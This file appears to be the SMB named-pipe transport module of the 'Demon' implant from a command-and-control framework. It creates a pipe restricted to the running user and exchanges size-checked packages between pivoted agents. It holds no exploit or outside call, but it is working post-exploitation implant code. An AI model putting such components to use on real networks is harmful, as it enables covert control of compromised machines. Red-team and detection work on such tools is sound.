#include <Demon.h>

#include <core/TransportSmb.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_SMB

BOOL SmbSend( PBUFFER Send )
{
    if ( ! Instance->Config.Transport.Handle )
    {
        SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
        SECURITY_ATTRIBUTES SecurityAttr = { 0 };

        /* Setup attributes so only our own user can connect to the pipe.
         * fail closed: if this fails we don't create the pipe at all,
         * an insecure pipe is worse than no pipe. */
        if ( ! SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr ) )
        {
            PUTS( "Failed to setup pipe security attributes" )
            SmbSecurityAttrFree( &SmbSecAttr );
            return FALSE;
        }

        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( Instance->Config.Transport.Name,  // Named Pipe
                                                                            PIPE_ACCESS_DUPLEX,              // read/write access
                                                                            PIPE_TYPE_MESSAGE     |          // message type pipe
                                                                            PIPE_READMODE_MESSAGE |          // message-read mode
                                                                            PIPE_WAIT,                       // blocking mode
                                                                            PIPE_UNLIMITED_INSTANCES,        // max. instances
                                                                            PIPE_BUFFER_MAX,                 // output buffer size
                                                                            PIPE_BUFFER_MAX,                 // input buffer size
                                                                            0,                               // client time-out
                                                                            &SecurityAttr );                 // security attributes

        SmbSecurityAttrFree( &SmbSecAttr );

        if ( ! Instance->Config.Transport.Handle )
            return FALSE;

        if ( ! Instance->Win32.ConnectNamedPipe( Instance->Config.Transport.Handle, NULL ) )
        {
            SysNtClose( Instance->Config.Transport.Handle );
            return FALSE;
        }

        /* Send the message/package we want to send to the new client... */
        return PipeWrite( Instance->Config.Transport.Handle, Send );
    }

    if ( ! PipeWrite( Instance->Config.Transport.Handle, Send ) )
    {
        PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );

        /* Means that the client disconnected/the pipe is closing. */
        if ( NtGetLastError() == ERROR_NO_DATA )
        {
            if ( Instance->Config.Transport.Handle )
            {
                SysNtClose( Instance->Config.Transport.Handle );
                Instance->Config.Transport.Handle = NULL;
            }

            Instance->Session.Connected = FALSE;
            return FALSE;
        }
    }

    return TRUE;
}

BOOL SmbRecv( PBUFFER Resp )
{
    DWORD BytesSize   = 0;
    DWORD DemonId     = 0;
    DWORD PackageSize = 0;

    if ( Instance->Win32.PeekNamedPipe( Instance->Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
    {
        if ( BytesSize > sizeof( UINT32 ) + sizeof( UINT32 ) )
        {
            if ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
                PRINTF( "Failed to read the DemonId from pipe, error: %d\n", NtGetLastError() )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            if ( Instance->Session.AgentID != DemonId )
            {
                PRINTF( "The message doesn't have the correct DemonId: %x\n", DemonId )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            if ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
            {
                PRINTF( "Failed to read the PackageSize from pipe, error: %d\n", NtGetLastError() )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            /* sanity check the package size before trusting it for an
             * allocation. packages over the pipe can never be larger
             * than PIPE_BUFFER_MAX. */
            if ( PackageSize == 0 || PackageSize > PIPE_BUFFER_MAX )
            {
                PRINTF( "Invalid PackageSize: 0x%x\n", PackageSize )
                Resp->Buffer = NULL;
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            Resp->Buffer = Instance->Win32.LocalAlloc( LPTR, PackageSize );
            Resp->Length = PackageSize;

            if ( ! Resp->Buffer )
            {
                PRINTF( "Failed to allocate 0x%x bytes for the package\n", PackageSize )
                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            if ( ! PipeRead( Instance->Config.Transport.Handle, Resp ) )
            {
                PRINTF( "PipeRead failed with to read 0x%x bytes from pipe\n", Resp->Length )
                if ( Resp->Buffer )
                {
                    Instance->Win32.LocalFree( Resp->Buffer );
                    Resp->Buffer = NULL;
                }

                Resp->Length = 0;
                Instance->Session.Connected = FALSE;
                return FALSE;
            }
            //PRINTF("successfully read 0x%x bytes from pipe\n", PackageSize)
        }
        else if ( BytesSize > 0 )
        {
            PRINTF( "Data in the pipe is too small: 0x%x\n", BytesSize )
        }
        else
        {
            // nothing to read
        }
    }
    else
    {
        /* We disconnected */
        PRINTF( "PeekNamedPipe failed with %d\n", NtGetLastError() )
        Instance->Session.Connected = FALSE;
        return FALSE;
    }

    return TRUE;
}

/* Took it from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_pivot_named_pipe.c#L286
 * But seems like MeterPreter doesn't free everything so let's do this too. */
BOOL SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSW         ExplicitAccess = { 0 };
    DWORD                    Result         = 0;
    HANDLE                   hToken         = NULL;
    PTOKEN_USER              UserToken      = NULL;
    ULONG                    TokenLength    = 0;
    /* zero them out. */
    MemSet( SmbSecAttr,   0, sizeof( SMB_PIPE_SEC_ATTR ) );
    MemSet( SecurityAttr, 0, sizeof( SECURITY_ATTRIBUTES ) );

    /* resolve the SID of the user we are running as. the pipe is only
     * meant for our own pivot children (which run as the same user),
     * not for every local user. if any step fails, fail closed: the
     * caller won't create the pipe without these security attributes.
     * partial allocations are cleaned up by SmbSecurityAttrFree. */
    if ( ! NT_SUCCESS( SysNtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
    {
        PRINTF( "NtOpenProcessToken failed: %x\n", NtGetLastError() );
        return FALSE;
    }

    SysNtQueryInformationToken( hToken, TokenUser, NULL, 0, &TokenLength );
    if ( ! TokenLength )
    {
        PRINTF( "NtQueryInformationToken failed: %x\n", NtGetLastError() );
        SysNtClose( hToken );
        return FALSE;
    }

    UserToken = MmHeapAlloc( TokenLength );
    if ( ! UserToken ||
         ! NT_SUCCESS( SysNtQueryInformationToken( hToken, TokenUser, UserToken, TokenLength, &TokenLength ) ) )
    {
        PRINTF( "NtQueryInformationToken failed: %x\n", NtGetLastError() );
        SysNtClose( hToken );
        if ( UserToken ) {
            DATA_FREE( UserToken, TokenLength );
        }
        return FALSE;
    }

    SysNtClose( hToken );
    hToken = NULL;

    ExplicitAccess.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ExplicitAccess.grfAccessMode        = SET_ACCESS;
    ExplicitAccess.grfInheritance       = NO_INHERITANCE;
    ExplicitAccess.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ExplicitAccess.Trustee.ptstrName    = UserToken->User.Sid;

    Result = Instance->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &SmbSecAttr->DAcl );
    if ( Result != ERROR_SUCCESS )
    {
        PRINTF( "SetEntriesInAclW failed: %u\n", Result );
        DATA_FREE( UserToken, TokenLength );
        return FALSE;
    }
    PRINTF( "DACL: %p\n", SmbSecAttr->DAcl );

    /* the SID has been copied into the ACL at this point */
    DATA_FREE( UserToken, TokenLength );

    if ( ! Instance->Win32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        PRINTF( "AllocateAndInitializeSid failed: %u\n", NtGetLastError() );
        return FALSE;
    }
    PRINTF( "sidLow: %p\n", SmbSecAttr->SidLow );

    SmbSecAttr->SAcl = MmHeapAlloc( MAX_PATH );
    if ( ! Instance->Win32.InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        PRINTF( "InitializeAcl failed: %u\n", NtGetLastError() );
        return FALSE;
    }

    if ( ! Instance->Win32.AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
        PRINTF( "AddMandatoryAce failed: %u\n", NtGetLastError() );
        return FALSE;
    }

    // now build the descriptor
    SmbSecAttr->SecDec = MmHeapAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    if ( ! Instance->Win32.InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        PRINTF( "InitializeSecurityDescriptor failed: %u\n", NtGetLastError() );
        return FALSE;
    }

    if ( ! Instance->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->DAcl, FALSE ) )
    {
        PRINTF( "SetSecurityDescriptorDacl failed: %u\n", NtGetLastError() );
        return FALSE;
    }

    if ( ! Instance->Win32.SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
        PRINTF( "SetSecurityDescriptorSacl failed: %u\n", NtGetLastError() );
        return FALSE;
    }

    SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
    SecurityAttr->bInheritHandle       = FALSE;
    SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );

    return TRUE;
}

VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    if ( SmbSecAttr->Sid )
    {
        Instance->Win32.FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    if ( SmbSecAttr->SidLow )
    {
        Instance->Win32.FreeSid( SmbSecAttr->SidLow );
        SmbSecAttr->SidLow = NULL;
    }

    if ( SmbSecAttr->SAcl )
    {
        MmHeapFree( SmbSecAttr->SAcl );
        SmbSecAttr->SAcl = NULL;
    }

    /* allocated by SetEntriesInAclW, must be freed with LocalFree */
    if ( SmbSecAttr->DAcl )
    {
        Instance->Win32.LocalFree( SmbSecAttr->DAcl );
        SmbSecAttr->DAcl = NULL;
    }

    if ( SmbSecAttr->SecDec )
    {
        MmHeapFree( SmbSecAttr->SecDec );
        SmbSecAttr->SecDec = NULL;
    }
}

#endif